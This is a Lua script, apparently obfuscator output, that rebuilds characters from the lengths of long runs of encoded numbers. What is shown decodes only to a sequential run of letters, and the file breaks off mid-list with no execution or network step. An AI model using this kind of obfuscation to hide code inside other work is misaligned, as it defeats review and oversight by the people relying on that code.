function etKsgFtKHCMwxEeCNSckyztRncwXsepbDnO(c)
tab={}
for i = 1,#c do
x=string.len(c[i]) 
y=string.char(x)
table.insert(tab,y)
end
x=table.concat(tab)
return x
end 


function DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu(code)res=etKsgFtKHCMwxEeCNSckyztRncwXsepbDnO({})for i in ipairs(code)do res=res..string.char(code[i]/105)end return res end 


function jwUVJKBTvwAfDgmlXHrTF(c)
tab={}
for i = 1,#c do
x=string.len(c[i]) 
y=string.char(x)
table.insert(tab,y)
end
x=table.concat(tab)
return x
end 


local b=jwUVJKBTvwAfDgmlXHrTF({DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410